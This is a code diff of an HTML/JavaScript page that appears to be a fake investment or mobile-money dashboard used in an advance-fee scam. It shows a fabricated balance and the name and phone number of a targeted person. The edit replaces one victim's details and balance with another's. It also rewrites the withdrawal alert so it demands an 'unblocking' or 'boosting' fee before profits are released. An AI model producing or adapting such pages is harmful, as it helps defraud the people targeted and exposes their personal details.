@@ -231,7 +231,7 @@
 <body>
     <script>
         let code = prompt("Veuillez entrer votre numéro de téléphone :");
-        if (code === "629248018") {
+        if (code === "620024592") {
             document.body.style.display = 'block';
         } else {
             alert("Numéro incorrect. Accès refusé.");
@@ -245,10 +245,10 @@
         </div>
         <nav>
             <div class="actions">
-                <span class="balance">Solde: 28 800 000 GNF</span>
+                <span class="balance">Solde: 17 350 000 GNF</span>
                 <div class="account-info">
-                    <span id="user-name"> SEKOU TOURE </span><br>
-                    <span id="user-phone"> 224 629 248 018</span>
+                    <span id="user-name"> MAMADOU BELLA DIALLO </span><br>
+                    <span id="user-phone"> 224 620 024 592 </span>
                 </div>
                 <button id="whatsapp-button">Contact WhatsApp</button>
                 <button id="logout-button">Déconnexion</button>
@@ -310,9 +310,9 @@
             setInterval(updatePrice, 5000);
 
             const setWithdrawalInfo = (method) => {
-                const accountName = "SEKOU TOURE";
-                const accountNumber = "224 629 248 018";
-                const balance = "28 800 000 GNF";
+                const accountName = "MAMADOU BELLA DIALLO";
+                const accountNumber = "224 620 024 592";
+                const balance = "17 350 000 GNF";
                 withdrawalInfo.innerHTML = `${accountName}<br>${accountNumber}<br>${balance}<br>via ${method}`;
                 withdrawalForm.style.display = 'flex';
             };
@@ -332,10 +332,10 @@
             });
 
             document.getElementById('confirm-withdrawal').addEventListener('click', () => {
-                alert('Cher SEKOU, veuillez payer les frais de déblocage afin de recevoir vos bénéfices immediatement.');
+                alert('Cher MAMADOU, vos fonds ont été géler désoler du désagrement, due au problème de réseau le serveur a rencontrer un léger boostage donc veuillez équilibrer le boostage afin de recevoir vos bénéfices immediatement.');
                 withdrawalForm.style.display = 'none';
                 errorMessage.style.display = 'block';
-                errorMessage.textContent = 'Erreur : Frais de déblocage néccéssaire.';
+                errorMessage.textContent = 'Erreur : Frais de boostage néccéssaire.';
             });
 
             document.getElementById('whatsapp-button').addEventListener('click', () => {
